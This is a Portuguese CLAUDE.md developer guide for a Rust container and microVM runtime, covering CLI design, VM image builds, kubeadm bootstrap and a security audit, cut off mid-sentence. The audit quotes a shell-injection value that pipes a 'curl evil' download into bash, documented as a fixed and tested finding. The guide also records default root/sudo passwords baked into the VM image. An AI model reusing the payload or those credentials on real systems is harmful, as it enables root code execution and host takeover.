# Delonix Runtime — guia do projeto (CLAUDE.md)

Motor de **containers e microVMs daemonless, rootless-first, kernel-native, em Rust**.
Repositório **público** (`angolardevops/delonix-runtime`, Apache-2.0) — extraído do monorepo
privado `delonix-paas` (ver [README.md](README.md) para a arquitectura dos 8 crates).

## Comandos

```bash
cargo build --workspace               # tudo
cargo test  --workspace               # testes
cargo build -p delonix-runtime-bin    # a CLI `delonix` (ver secção "CLI" abaixo)
```

## CLI (`delonix`)

O binário `delonix` (crate `delonix-runtime-bin`) é a CLI opensource completa deste motor —
homóloga ao Docker, distinta do `delonix`/`delonixctl` privados do `delonix-paas` (outro
repo/branch/remote, não afectados por nada aqui). Comandos agrupados semanticamente em vez de
uma lista plana, um módulo por grupo em `crates/delonix-runtime-bin/src/cmd/`:

- `delonix container` — run/ps/stop/rm/exec/logs/**update**/**describe**. `run` aceita `-v/--volume` (nomeado ou bind
  mount, via `delonix-volume::VolumeStore::resolve_spec`, testado e funcional) e
  `--net host|none|<rede>`. `host`/`none` — comportamento original, inalterado, testado. `--net
  <rede-custom>` (`delonix-net::infra::attach_container` cria a netns NOMEADA do lado do holder,
  `RunSpec.join_netns` faz o container juntar-se a ela via `setns`) **está com uma limitação
  conhecida em rootless**: o `setns` falha com "netns do pod indisponível" — a netns fica dentro
  do userns mapeado do HOLDER (`unshare --user --map-root-user`, ver `infra::start_holder`), e o
  processo do container, sem privilégio nesse userns, não a consegue abrir. A doc do próprio
  `delonix-net` já aponta o mecanismo certo ("re-exec via `nsenter … ip netns exec`", ver
  `RunSpec.inherit_userns`), mas **não há hoje nenhum caminho no `delonix-runtime`/
  `delonix-runtime-bin` que faça esse re-exec para um container `run` normal** — só existe para
  o holder se auto-relançar. Fechar isto é trabalho de motor (crate `delonix-runtime`), não de
  CLI — ficou fora desta reestruturação; documentado aqui para não se repetir a investigação.
- `delonix image` — pull/ls/rm/export (bundle OCI para `runc`/`crun`).
- `delonix build -t <tag> [-f Dockerfile|Delonixfile] [contexto]` — único grupo com orquestração
  nova (as outras têm API pronta nas crates, isto é "ligar os fios"): sobe um container de
  trabalho (`sleep infinity`), corre cada `RUN` via `exec`, aplica `COPY` no rootfs em disco, e
  empacota com `ImageStore::commit_flat_rootfs` (rootless) ou `commit_upper`+`build_image` (root).
  **Só single-stage** — um Dockerfile com `FROM ... AS <nome>` seguido doutro `FROM` é recusado
  com erro claro; multi-stage fica para uma iteração seguinte (precisa de desenhar a passagem de
  rootfs entre estágios). **`Delonixfile`**: sem `-f`, `default_build_file` (`cmd/build.rs`)
  procura `<contexto>/Delonixfile` antes de `Dockerfile` — mesma gramática (`parse_dockerfile`
  já suporta as extensões Delonix `SCAN`/`CPUS`/`MEMORY`/`SECURITY`/`HEALTHCHECK`
  independentemente do nome do ficheiro); `Delonixfile` é só o nome canónico por omissão.
- `delonix vm` — create/ls/stop/rm/status, flags 1:1 com `delonix_vm::VmConfig`.
- `delonix volumes` — create/ls/rm/inspect, wrapper fino sobre `VolumeStore`.
- `delonix network` — ls/create/rm/inspect. **Dois stores em paralelo, deliberado**:
  `NetworkStore` (registo declarativo rico — drivers bridge/macvlan/ipvlan/overlay) e
  `infra::{network_create_with,network_remove}` (plano físico do holder netns rootless). Para o
  driver `bridge` (o único que os containers atacham hoje), `network create` orquestra os dois
  em conjunto; `macvlan`/`ipvlan`/`overlay` só ficam no `NetworkStore` (limitação conhecida).
- `delonix storage` — armazenamento de REDE (NFS/CIFS-SMB/WebDAV) montável como volume, estilo
  PersistentVolume do k8s. `create/ls/inspect/rm/apply` + `kind: Storage`. Uma pasta de um NAS
  (TrueNAS/Synology/Nextcloud) vira um volume nomeado que qualquer container monta com `-v <nome>:/x`.
  Por baixo é um volume do `delonix-volume` com driver de rede (o `ensure_mounted` monta via
  `mount -t nfs|cifs|davfs`); a declaração amigável (server/share/credenciais) é traduzida no
  device/options por `storage::build_mount`. Password via cofre (`--password-secret` → chave
  `password` do segredo). Validado end-to-end com NFS real: um container LEU e ESCREVEU num volume de
  rede e a escrita chegou ao NAS (ver `examples/storage.yaml` + `examples/nas-vm-cloud-config.yaml`,
  a receita da VM Samba+NFS de validação). **Montar NFS/CIFS precisa de CAP_SYS_ADMIN** (root ou
  sessão privilegiada) — em rootless puro o `mount -t` falha claro.
- `delonix stack apply [-f delonix-manifest.yaml]` — ver secção "Manifesto/apply" abaixo.

## Output: `ls` estilo docker, `describe` estilo kubectl (`cmd/output.rs`)

Toda a formatação passa por `cmd/output.rs` — `Table` (mede as colunas pelo conteúdo real; antes
cada grupo tinha larguras hardcoded `{:<20}` e a tabela desalinhava assim que um nome as passava),
`Describe` (blocos `kubectl`-like) e `fmt_size`/`fmt_local`/`fmt_age`/`fmt_duration_secs`.
**Sem dependências novas** — não há `comfy-table`/`tabled`/`chrono` na árvore e não vale a pena
aumentar a superfície de supply-chain de um runtime de containers por um alinhador de colunas.

> **Excepção deliberada: `ratatui` (`delonix dash`).** O dashboard interactivo
> (`delonix dash` + `container/vm/network/storage/image dash`) usa `ratatui`
> (traz `crossterm`) — a única dependência de UI que quebra a regra acima, por
> decisão explícita do utilizador (queria um TUI estilo htop, não um snapshot).
> Está **confinada ao bin** (`delonix-runtime-bin`); os crates de motor
> continuam dep-limpos (`cargo tree -e normal` deles não a mostra). O modo
> `delonix dash --once` (snapshot de texto ANSI) não a usa em runtime. Registado
> aqui para a auditoria futura não a tratar como acidental — ver `cmd/dash.rs`.

- `container ls` tem as 7 colunas do `docker ps`. O `Up …` sai do `pid_starttime` do init e **não**
  do `created_unix`: um container criado ontem e reiniciado há 5 min mostraria "Up 1 day" — falso
  exactamente quando interessa (a depurar um crash-loop).
- `fmt_duration_secs` porta o `units.HumanDuration` do docker **à letra**, baldes incluídos (dias
  até às 2 semanas, semanas até aos 2 meses). É essa escolha de baldes — e não um caso especial —
  que impede o "1 weeks" que a primeira versão daqui imprimia.
- **`describe` é aditivo; os `inspect` ficam como estavam.** `describe` = humanos, `inspect` = JSON
  para scripts. É uma CLI pública: migrar `volumes/network inspect` de texto para JSON seria
  breaking change e não se fez.
- `stack describe` não inventa estado: o stack **não tem registo próprio**, por isso parte do
  manifesto e vai confirmar a presença de cada recurso ao store respectivo (mesma filosofia do
  `cluster ls`, que deriva das labels). Não faz drift-detection — isso é trabalho de orchestrator.

## Reconfiguração a quente (`delonix container update`)

`container update <id>` muda **portas, volumes, redes e limite de banda sem parar o container** —
o PID não muda. É a diferença de fundo para o docker (onde mudar uma porta obriga a recriar):
aqui o dataplane não pertence ao ciclo de vida do processo. Flags: `--publish-add/--publish-rm`,
`--volume-add/--volume-rm`, `--net-connect/--net-disconnect`, `--net-rate/--net-burst/
--net-rate-clear`. **Remoções correm antes das adições**, para `--publish-rm 8080 --publish-add
8080:9000` funcionar num só comando.

Isto ligou APIs do motor que existiam há muito e **nunca tiveram um único chamador** —
`mount_live`/`unmount_live`, `attach_extra_container`/`detach_extra_container`,
`set_net_rate`/`clear_net_rate`. Por nunca terem sido chamadas, tinham um bug que só apareceu
agora (ver abaixo).

**Persistência**: cada operação grava no registo assim que o dataplane confirma, uma a uma, via
`Store::update` (flock — o CRI é concorrente). Não há transacionalidade: se a terceira falhar, as
duas primeiras JÁ estão aplicadas no kernel e um registo escrito só no fim ficaria a mentir.

**Limitações conhecidas, por desenho**:
- `--net-connect`/`--net-rate` exigem `--net <rede>`: o veth e o shaping vivem no netns do holder,
  que o caminho slirp-por-container (`--net host/none`) não tem.
- `--publish-add` num container criado **sem `-p` e sem `--net <rede>`** é impossível: o
  api-socket do slirp só é aberto quando o `run` leva portas (`slirp_attach`). Erro explícito.

**BUG CORRIGIDO ao ligar isto** (`mount_live`/`unmount_live`): gatavam o `setns(user)` em
`container.userns`, mas esse campo diz se o container **criou** o seu userns — os do ingress
rootless **herdam** o do holder e ficam com `userns=false` apesar de estarem num userns diferente
do nosso. Sem o setns, o `unshare(NEWNS)` seguinte dava EPERM e **toda** a montagem a quente
falhava (código 124). É o mesmo bug que o `exec` já teve e corrigiu — passam a abrir sempre o ns
`user` e a deixar o skip-por-inode do `open_container_ns` decidir. Lição a reter: **`container.
userns` não é "está num userns diferente do meu"**; nunca o usar para essa pergunta.

## Manifesto/apply (`delonix-manifest.yaml`)

Manifesto declarativo multi-documento, ao estilo Kubernetes (`apiVersion: delonix.io/v1` /
`kind` / `metadata.name` / `spec`), para os 5 Kinds com grupo de CLI: `Network`/`Volume`/
`Image`/`Vm`/`Container`. Parsing central em `cmd/manifest.rs` (`serde_yaml`, só neste binário —
não entra em nenhum crate de mecanismo). Cada grupo (`cmd/{network,volume,image,vm,
container}.rs`) tem um `spec` tipado próprio (`NetworkSpec`, `VolumeSpec`, ...) e uma função
`pub fn apply(docs: &[ManifestDoc])` que filtra o seu Kind e aplica.

- **`delonix <container|image|vm|volumes|network> apply [-f ficheiro]`** — aplica só os
  documentos do Kind desse grupo (ignora os outros). Sem `-f`, usa `./delonix-manifest.yaml`
  (erro claro se não existir).
- **`delonix stack apply [-f ficheiro]`** — aplica TODOS os Kinds, por esta ordem (dependência
  por nome): Network → Volume → Image → Vm → Container. **Fail-fast, sem transacionalidade**: o
  que já foi aplicado antes de um erro FICA aplicado (sem rollback).
- **Semântica de `apply`: "garante presente", não um reconciliador.** Sem diffing/rollout/
  drift-detection contínua — isso é trabalho de um orchestrator com controllers (deliberadamente
  fora de escopo aqui; o equivalente privado, `delonix-orchestrator`, fica só no `delonix-paas`).
  Idempotência por Kind: `Network`/`Container` verificam existência por nome antes de criar
  (`store.get`/procura no `Store` por `c.name`); `Volume`/`Vm` já são idempotentes na própria API
  do crate (`VolumeStore::create*`, `delonix_vm::create`); `Image` com `spec.pull` é idempotente
  (`resolve_or_pull`), com `spec.build` reconstrói e substitui a tag a cada `apply` (não há cache
  de build). `kind: Container`'s `spec.detach` tem **default `true`** (diferente do CLI `run`,
  onde é `false`) — um `apply` em primeiro plano bloquearia à espera do processo terminar.
- Exemplo completo de manifesto e o mapeamento spec↔CLI: ver o doc-comment de
  `crates/delonix-runtime-bin/src/cmd/manifest.rs` e o plano desta sessão
  (`/home/walter/.claude/plans/mellow-cuddling-canyon.md`, mantido para referência histórica).

## Imagem VM dourada (`delonix image --vm`)

`delonix image --vm ls|pull|push|build` gere imagens VM à parte das imagens de container
(`ImageStore`) — um `.qcow2` solto + `.json` de metadados por imagem, em `<root>/vm-images/`
(`crates/delonix-runtime-bin/src/cmd/vmimage.rs`, `VmImageStore`). Prepara o terreno para
`delonix cluster kubeadm` (secção "Cluster kubeadm" abaixo — já implementado): a imagem já vem
com `kubeadm`/`kubelet`/`kubectl` e o `delonix-cri` a correr como serviço systemd — **arrancar um
nó não faz nenhuma instalação**, só `kubeadm init`/`kubeadm join`.

- **`build`**: descarrega a cloud image Ubuntu (`cloud-images.ubuntu.com/releases/<release>/
  release/`, cache em `<root>/vm-images/_base/`, valida contra `SHA256SUMS` — nunca aceita um
  download sem verificar), achata-a (`qemu-img convert`, sem depender de um backing-file local
  no artefacto final), e corre `virt-customize` com uma lista de passos construída em Rust por
  `k8s_customization_steps()` — **isto é o "100% parametrizado"**: `--extra-package`/
  `--extra-run` estendem sem tocar no código. Instala o repositório `pkgs.k8s.io` +
  `kubeadm`/`kubelet`/`kubectl`, desliga swap, carrega `overlay`/`br_netfilter` + sysctls
  exigidos pelo kubelet/CNI, injecta o binário `delonix-cri` (ver abaixo) + a unit systemd
  (`dist/delonix-cri.service`, `systemctl enable`), e cria a conta padrão pedida: `root`/senha
  `delonix`, utilizador `delonix:delonix` em `sudo` com `NOPASSWD`. cloud-init fica ACTIVO na
  imagem (o build só corre uma vez; o cloud-init do primeiro-boot de CADA VM continua a aplicar
  hostname/SSH-keys — ver `delonix vm create` abaixo).
- **Tamanho do artefacto (medido, golden 24.04: 2.38 GiB → 677 MiB, −72%)** — três passos, todos
  no fim do `build`, cada um com uma razão concreta:
  1. **`apt-get clean` + `rm -rf /var/lib/apt/lists/*`** (último `CustomizeOp`, DEPOIS do
     `--extra-run` do utilizador, que pode instalar mais pacotes). Media na golden: `/var/cache/apt`
     ~181 MiB + `/var/lib/apt/lists` ~186 MiB = **~367 MiB de lixo** que enchiam a raiz a **92%**
     (179 MiB livres — perigoso para um nó k8s: o kubelet despeja perto do limite). Depois: 77%,
     546 MiB livres. Fica em `k8s_customization_steps` e **não** em `k8s_recipes` — aquele catálogo
     é PARTILHADO com `cluster apply`, que prepara hosts VIVOS; limpar cache é preocupação do
     ARTEFACTO, não da preparação de um host.
  2. **`virt-sparsify --in-place`** — zera os blocos que a limpeza libertou (sem isto continuam a
     ocupar no qcow2). Best-effort: se falhar, o build segue (só perde tamanho).
  3. **`qemu-img convert -c -o compression_type=zstd`** — a cloud image da Ubuntu **vem comprimida**
     e o `convert` inicial (sem `-c`) descomprime-a; sem este passo o artefacto fica ~4x maior que
     a base (593 MiB → 2.38 GiB). **zstd e não o zlib por omissão**: comprime 5x mais rápido
     (10s vs 53s), fica menor (868 vs 894 MiB no mesmo input), e sobretudo **descomprime** muito
     mais rápido — importa porque a golden é o **backing file read-only** das VMs
     (`delonix_vm::create` faz um overlay qcow2 por VM), logo cada leitura do SO base passa pelo
     descompressor. Escapatória: `--no-compress`. Custo total: ~12s de build.
- **`--offline` (PREFERIR SEMPRE; validado 2026-07-17, build em 1m18s)** — obtém os `.deb` do k8s
  no **HOST** e corre o `virt-customize` com **`--no-network`**. O appliance nunca precisa de
  DHCP/DNS, o que **dispensa os workarounds de host** (passt/dhclient) que o caminho online
  exige — ver "Bloqueio de execução conhecido" abaixo. Validado com o `passt` ATIVO, sem tocar
  no host.
  - **Cadeia de confiança: a MESMA do apt, feita no host em vez do guest** — `InRelease`
    (clearsigned, verificado com `gpgv` contra a `Release.key` do repo, keyring TEMPORÁRIO —
    nunca toca no do utilizador) → SHA256 do índice `Packages` (declarado no InRelease assinado)
    → SHA256 de cada `.deb` (declarado no `Packages` autenticado). **Falha FECHADO** em qualquer
    passo — mesmo princípio do achado CRÍTICO nº3 da auditoria (`pull_oci_artifact` sem digest).
  - **Porque `dpkg -i` chega** (medido, não suposto): o fecho são só **4 `.deb` do repo k8s**
    (`kubeadm`/`kubectl`/`kubelet` + `kubernetes-cni`); as restantes deps do kubelet
    (`iptables`/`mount`/`util-linux`/`libc6`) **já vêm na cloud image**. Se alguma faltar, o
    `dpkg` falha ALTO — nunca deixa o guest meio-instalado.
  - **Armadilha (custou um build)**: `kubernetes-cni` tem versionamento PRÓPRIO (1.7.x), não
    segue o do k8s — o filtro `--k8s-version 1.34` só se aplica aos componentes core
    (`parse_packages_index`, parâmetro `versioned`). Há teste de regressão.
  - As receitas sem rede (swap/módulos/sysctls) são partilhadas tal e qual com o caminho online
    (`k8s_recipes::k8s_config_recipes`) — os dois modos **não divergem**. `k8s_host_recipes()` =
    as 2 de rede + estas, para o `cluster apply` (hosts vivos) continuar a ver o catálogo todo.
  - Equivalência com o online **provada**: mesmos pacotes e mesmo estado de hold —
    `kubeadm`/`kubectl`/`kubelet` `hi` 1.34.9-1.1, `kubernetes-cni` `ii` 1.7.1-1.1.
- **`push`/`pull`**: publicam/obtêm a imagem como artefacto OCI de blob único (config vazio + 1
  layer, padrão ORAS/Helm) via `delonix_image::registry::{push_oci_artifact,pull_oci_artifact}`
  (`crates/delonix-image/src/registry.rs`) — generaliza o `Client`/auth/upload já usado por
  `push_to_registry` (imagens de container), sem duplicar a lógica. **RESOLVIDO — publicação real
  feita e verificada (2026-07-17)**: `ghcr.io/angolardevops/delonix-vm-k8s:1.34` (678 MiB, a
  golden já optimizada), com round-trip **byte-idêntico** (pull de volta → mesmo sha256, o que
  exercita também a verificação de digest do `pull_oci_artifact`). Auth via `delonix image login
  ghcr.io -u angolardevops --password-stdin` (grava em `<root>/auth.json`); o token `gh` precisa
  do scope `write:packages`. **Gap conhecido**: o `pull` NÃO recupera os metadados
  (`ubuntu_release`/`k8s_version` ficam `null` — o artefacto OCI só carrega o blob qcow2), por
  isso um `image vm ls` de uma imagem puxada mostra `-` nessas colunas.
- **Bloqueios de host do `virt-customize` — DESAPARECEM com `--offline`** (diagnosticados a
  fundo em 2026-07-17; só afectam o caminho ONLINE, que precisa de DHCP/DNS no appliance):
  1. **Appliance sem cliente DHCP** → `apt-get install` falha com "Could not resolve host".
     Causa-raiz: o `supermin.d/packages` pede `isc-dhcp-client`, mas o supermin só COPIA do host
     e o pacote não estava instalado; o init do appliance tenta `dhclient` e só cai em `dhcpcd`
     como fallback — que também não está nos `hostfiles`. Fix: `sudo apt install isc-dhcp-client`
     (é o que o supermin espera; não é revertido por updates, ao contrário de editar o
     `hostfiles`, que pertence ao pacote `libguestfs0t64`).
  2. **`passt` não dá lease** → o `dhclient` pendura 300s e o build segue SEM rede. Duas camadas:
     (a) o AppArmor (`/etc/apparmor.d/usr.bin.passt`) nega criar socket/PID em
     `/run/user/1000/libguestfs*/` — confirmado por `dmesg | grep 'apparmor.*DENIED.*passt'`; o
     perfil só permite `owner /tmp/**` e `owner @{HOME}/**`, logo
     `XDG_RUNTIME_DIR=$HOME/.cache/libguestfs-run` contorna-o SEM tocar no host. (b) Mesmo assim
     o passt nunca atribui lease (o libguestfs corre-o com `--address 169.254.2.15`), pelo que
     ainda é preciso tirá-lo do PATH (`sudo mv /usr/bin/passt /usr/bin/passt.off`, com `trap`
     para restaurar SEMPRE) → o libguestfs cai no slirp do qemu, que funciona.
  **Conclusão: usar `--offline` e nada disto é preciso.** O `/usr/lib/guestfs` (symlink para
  `/usr/lib/x86_64-linux-gnu/guestfs`, por faltar `libguestfs-common`) continua a ser preciso
  nesta máquina, nos dois modos.

`delonix vm create` ganhou `--hostname`/`--ssh-key <chave-ou-@ficheiro>`/`--user-data <ficheiro>`
— sem `--seed` explícito, gera um ISO NoCloud (`cloud-localds`) por-instância se qualquer um
destes for dado (função pura `build_user_data`, testável sem `cloud-localds` real). Não confundir
com o `build` acima: aquele corre uma vez por IMAGEM (golden), isto corre uma vez por VM.

`delonix-cri` (`crates/delonix-cri`) ganhou o seu primeiro `[[bin]]` (`src/bin/delonix-cri.rs`)
— antes só existia como library, chamado por ninguém no workspace. Corre `serve_blocking` num
socket unix (`$DELONIX_CRI_ADDR`, default `/run/delonix-cri.sock`) — é o endpoint que o kubelet
fala via `--container-runtime-endpoint`, substituindo containerd/CRI-O.

## Cluster kubeadm (`delonix cluster apply`)

`delonix cluster apply [-f cloud.yaml]` (`kind: Cluster`) — bootstrap `kubeadm` idempotente sobre
SSH em hosts JÁ VIVOS e alcançáveis (não cria VMs — isso é `delonix vm create`, acima). Módulos:
`cmd/remote.rs` (shell-out a `ssh`/`scp` do sistema, `sudo -n` para os comandos remotos — o
utilizador SSH tem de já ter sudo NOPASSWD), `cmd/k8s_recipes.rs` (catálogo PARTILHADO com
`vmimage::build` — repositório `pkgs.k8s.io`/pacotes/swap/módulos/sysctls — para a imagem
dourada e um host preparado por `cluster apply` ficarem exactamente iguais), `cmd/cluster.rs`
(orquestração: prepara todos os hosts → `kubeadm init` no 1.º control-plane → `kubeadm join` dos
restantes control-planes → `kubeadm join` dos workers → traz o kubeconfig para
`<root>/clusters/<nome>-kubeconfig.yaml`, e copia para `~/.kube/config` se ainda não existir).

**Idempotência sem-estado** (pedido explícito, "parecido ao Terraform mas sem ficheiro de
estado"): cada passo de `k8s_recipes` tem um `check` (comando shell, êxito = já satisfeito) e um
`apply`; `kubeadm init`/`join` verificam `/etc/kubernetes/admin.conf`/`kubelet.conf` no host antes
de agir. Nunca dessincroniza de um `.tfstate` porque não há nenhum.

**Simplificações da v1** (pedido era "hosts arbitrários", escopo já grande sem estas):
- **Só etcd `stacked`** (default do kubeadm, co-localizado nos control-planes) — `etcd: external`
  é reconhecido no schema mas recusado com erro claro. Etcd externo (TLS entre membros,
  discovery) é um subprojecto à parte.
- **Execução sequencial**, não paralela, entre hosts — paralelizar a preparação (independente por
  host) é um follow-up de performance, não de correcção.
- **HA multi-control-plane exige `spec.controlPlaneEndpoint` explícito** — kubeadm precisa de um
  endpoint estável (LB/VIP) à frente de vários control-planes; com 1 só, usa o IP dele.
- Sem teste end-to-end real nesta sessão — este sandbox não tem hosts SSH remotos. Validado até à
  fronteira real: parsing/validação do manifesto, resolução do `delonix-cri`, geração dos
  comandos `kubeadm init`/`join`, e a tentativa real de SSH falha correctamente e com clareza
  (`No route to host` num IP de teste) — não há mais nada para simular sem máquinas verdadeiras.

### `delonix cluster kubeadm --name <n> --control-plane <n> --workers <n>`

Camada por cima de `cluster apply` (pedido original, primeira sessão desta série: "um comando,
do zero a um cluster a funcionar"). Não escreve nem exige um `cloud.yaml` — provisiona as VMs e
constrói o `ClusterSpec` em memória, depois chama a MESMA `apply_one` que `cluster apply` usa
(zero duplicação da lógica kubeadm/SSH/validação de segurança — tudo em `cmd/cluster.rs`,
`ClusterCmd::Kubeadm`/`provision_and_apply`).

Fluxo: **resolve a imagem VM dourada** (`--vm-image` ou a única existente em
`VmImageStore` — erro claro se houver 0 ou mais de 1, nunca escolhe às cegas) → **gera ou
carrega uma chave SSH** (`--ssh-key`, ou `ssh-keygen -t ed25519` não-interactivo em
`<root>/clusters/<nome>/id_ed25519`) → **cria as VMs sequencialmente**
(`<nome>-cp1..N`/`<nome>-w1..M`, via `delonix_vm::create` com a imagem dourada como disco +
`cmd::vm::generate_seed_iso` para o cloud-init por-instância, reaproveitado tal-e-qual de
`delonix vm create --ssh-key`) → **espera cada VM ficar alcançável por SSH**
(`wait_for_vm_ssh_ready`: primeiro o IP via `delonix_vm::status`, depois um `ssh_check` real —
`--boot-timeout`, default 300s) → constrói o `ClusterSpec` (utilizador SSH sempre `delonix`, a
conta que a imagem dourada já cria) → `validate()` + `apply_one()` (mesmas defesas da auditoria
de segurança, herdadas automaticamente).

**Limitação conhecida**: só suporta **1 control-plane** por agora — com `--control-plane > 1`
recusa com erro claro, porque kubeadm HA exige um endpoint estável (LB/VIP) à frente dos
control-planes, e este comando ainda não provisiona um automaticamente. Para HA hoje, usa
`delonix cluster apply` com um `controlPlaneEndpoint` externo já preparado.

**Sem teste end-to-end real nesta sessão**: o `virt-customize` do build da imagem dourada está
bloqueado neste sandbox (pacote `libguestfs-common` em falta, já documentado acima) — sem uma
imagem local, `delonix cluster kubeadm` não tem o que provisionar. Validado até essa fronteira
real: parsing de flags, `resolve_vm_image` (0/1/N imagens, com testes automatizados), geração de
nomes determinísticos (`vm_names`), e o erro claro e correcto quando não há imagem nenhuma.

## Auditoria de segurança (skill `delonix-runtime-sec`)

Antes de estender `delonix cluster apply`, foi feita uma auditoria ofensiva dedicada (skill nova
`.claude/skills/delonix-runtime-sec/`, perfil de red-team especializado em runtimes de
containers/VMs) — 3 revisões adversariais em paralelo (injecção de comandos, escalada de
privilégio/fuga de namespace, memory safety + cadeia de fornecimento + path traversal).

**Veredicto da fronteira rootless→root**: sólida, nenhum CRÍTICO/ALTO. Socket de controlo do
holder valida `SO_PEERCRED` correctamente entre user namespaces; `join_netns` só recebe caminhos
gerados server-side (nunca input directo do CLI); mapeamento de uid não permite apontar para uid
0 real do host em nenhum dos 3 caminhos (root real/rootless single-uid/rootless com subuid).

**4 achados CRÍTICOS confirmados e CORRIGIDOS nesta mesma sessão** (todos em código novo desta
sessão, nunca tinham sido revistos adversarialmente):

1. **Injecção de comandos via manifesto `Cluster`** — `controlPlaneEndpoint`/`podSubnet`/
   `serviceSubnet`/`k8sVersion` entravam sem saneamento num `format!` que vira o CORPO de um
   `sudo -n bash -c` remoto (`cmd::cluster::kubeadm_init`/`kubeadm_join`). Um `cloud.yaml` com
   `controlPlaneEndpoint: "10.0.0.10; curl evil|bash; #"` era RCE como root no host de produção.
   **Corrigido**: `cmd::cluster::{valid_endpoint,valid_cidr,valid_version}` — whitelist estrita de
   caracteres, chamada em `validate()` antes de qualquer interpolação. `shell_quote` (`remote.rs`)
   só protege a fronteira ssh→bash-c local — nunca sanitiza o CONTEÚDO do comando; esta era a
   lição a reter (documentada nos comentários das funções `valid_*`).
2. **Mesmo vector via `k8sVersion` em `k8s_recipes::k8s_host_recipes`** (repositório apt,
   corrido em TODOS os hosts, incluindo antes do `kubeadm init`) — **corrigido** com a mesma
   validação, reaproveitada também em `vmimage::cmd_build` (`--k8s-version` tem o mesmo caminho).
3. **`pull_oci_artifact` não verificava o digest do blob recebido** contra o manifesto — um
   registo `ghcr.io` comprometido podia servir uma imagem VM dourada adulterada sem detecção.
   **Corrigido**: verificação `sha256(bytes) == digest_esperado` antes de devolver, mesmo padrão
   já usado por `pull_from_registry_with_creds` (que já estava correcto).
4. **Path traversal em `COPY` do `delonix build`** — `src`/`dst` de um Dockerfile/Delonixfile não
   eram confinados ao contexto/rootfs (`..` não neutralizado). **Corrigido**: `cmd::build::
   safe_join` (mesmo padrão de `safe_rel` em `delonix-image::overlay`), rejeita qualquer
   componente `..`/absoluto fora da base.

**2 achados BAIXOS, defesa em profundidade, também corrigidos**: `--` antes de `user@host` nos
argv de `ssh`/`scp` (`remote.rs`); `VmImageStore::base_cache_path` passou a usar `sanitize()`
como os outros métodos do store (`vmimage.rs`).

Todos os 4 CRÍTICOS têm teste automatizado a replicar o exploit e confirmar a rejeição (`cargo
test -p delonix-runtime-bin`/`-p delonix-image`) — ver `cmd::cluster::tests::
validate_recusa_endpoint_malicioso_no_manifesto_completo`,
`registry::tests::pull_oci_artifact_recusa_blob_adulterado`,
`cmd::build::tests::safe_join_recusa_dot_dot`.

## Cluster modo Kind sem Docker — investigação (GO/NO-GO)

Pedido: `delonix cluster` em modo `kind` (sem `kubeadm`) a funcionar **sem Docker instalado** —
`delonix` substituiria Docker/Podman como backend do `kind`. Antes de investir no shim de
compatibilidade Docker (grande — emulação de templates Go, `network create`, `run` com
`--publish`/`--tmpfs`/`--restart`/`--cgroupns`, `logs -f`), fez-se: (1) investigação empírica da
superfície real que o `kind` exige de um backend, (2) 2 bugs corrigidos em `delonix image pull`
que bloqueavam qualquer teste, (3) um spike de validação — a imagem `kindest/node` (systemd +
containerd aninhado) sequer arranca sob o nosso modelo de isolamento?

### Superfície capturada (referência para a fase do shim)

Investigação empírica (não suposição): `docker` real envolvido num wrapper que regista cada
invocação, com um `kind create cluster` real de ponta a ponta — **52 invocações capturadas**.
Comandos usados por um backend "docker": `info --format {{json .}}` (+ variantes `-f {{.Driver}}`,
`--format '{{json .SecurityOptions}}'`, `-f {{json .DriverStatus }}`), `ps -a --filter
label=io.x-k8s.kind.cluster=<n> --format {{.Names}}`, `inspect --type=image <ref>`, `pull <ref>`,
`network ls --filter=name=^kind$ --format={{.ID}}`, `network inspect bridge -f {{ index .Options
"com.docker.network.driver.mtu" }}`, `network create -d=bridge -o
com.docker.network.bridge.enable_ip_masquerade=true -o com.docker.network.driver.mtu=1500 --ipv6
--subnet <cidr> kind`, `run --name <n> --hostname <n> --label io.x-k8s.kind.role=... --privileged
--security-opt seccomp=unconfined --security-opt apparmor=unconfined --tmpfs /tmp --tmpfs /run
--volume /var --volume /lib/modules:/lib/modules:ro -e KIND_EXPERIMENTAL_CONTAINERD_SNAPSHOTTER
--detach --tty --label io.x-k8s.kind.cluster=<n> --net kind --restart=on-failure:1 --init=false
--cgroupns=private --publish=127.0.0.1:<porta>:6443/TCP -e KUBECONFIG=... <imagem>`, `logs -f
<n>`, `inspect --format {{ index .Config.Labels "io.x-k8s.kind.role"}} <n>`, `exec --privileged
[-i] <n> <cmd>` (repetido para `cat`/`mkdir`/`cp /dev/stdin`/`kubeadm init`/`kubectl ...`),
`inspect -f {{range .NetworkSettings.Networks}}{{.IPAddress}},{{.GlobalIPv6Address}}{{end}} <n>`,
`inspect --format {{ with (index (index .NetworkSettings.Ports "6443/tcp") 0) }}{{ printf "%s\t%s"
.HostIp .HostPort }}{{ end }} <n>`, `rm -f -v <n>`.

Templates Go usados pelo `kind` são um conjunto **finito e conhecido** (capturado acima) — a fase
do shim pode emular por **correspondência exacta das strings**, sem motor de templates Go em Rust.

### 2 bugs corrigidos em `delonix image pull` (`crates/delonix-image/src/registry.rs`)

1. **`parse_reference` não tratava `repo:tag@digest`** (formato combinado, usado pela própria
   referência `kindest/node:v1.34.0@sha256:...`) — o ramo `@` cortava a referência sem primeiro
   remover a tag do lado do `repo`, produzindo uma URL de manifesto malformada. Testes de
   regressão: `parses_repo_tag_and_digest_combined`, `parses_repo_tag_and_digest_combined_com_registo_explicito`.
2. **Timeout de 120s demasiado curto** em `registry_client`/`pull_from_registry_with_creds` —
   `kindest/node` tem layers de várias centenas de MB; o `reqwest` cortava a leitura do corpo a
   meio, reportado como `"error decoding response body"` (não é erro de parsing, é leitura
   interrompida). Subido para 600s, alinhado com `push_to_registry`/`push_oci_artifact`.

Confirmado com um smoke test real: `delonix image pull kindest/node:v1.34.0@sha256:...` completa
em ~2min (antes falhava sempre, nos dois bugs).

### Spike GO/NO-GO: `container run --privileged` — resultado: **NO-GO nesta v1**

Achado inesperado antes mesmo do spike: o motor **já tem** lógica dedicada de delegação de
cgroup2 para nodes Kind (`setup_node_cgroup_ns` em `crates/delonix-runtime/src/lib.rs`), activada
quando `--privileged` + uma label `io.x-k8s.kind.*` está presente — trabalho não documentado
antes desta sessão. Para a poder exercitar, adicionou-se uma flag `--label KEY=VAL` (repetível) a
`delonix container run` (`crates/delonix-runtime-bin/src/cmd/container.rs`) — não existia
nenhuma forma de definir labels via CLI, só internamente. Ficou como funcionalidade permanente
(expõe um campo já existente em `Container`, não é específico de Kind).

Com a label e `--privileged`, `kindest/node` **crasha sempre no mesmo ponto**, muito cedo — logo
a seguir a `INFO: detected cgroup v1` no log do próprio entrypoint da imagem (que corre num host
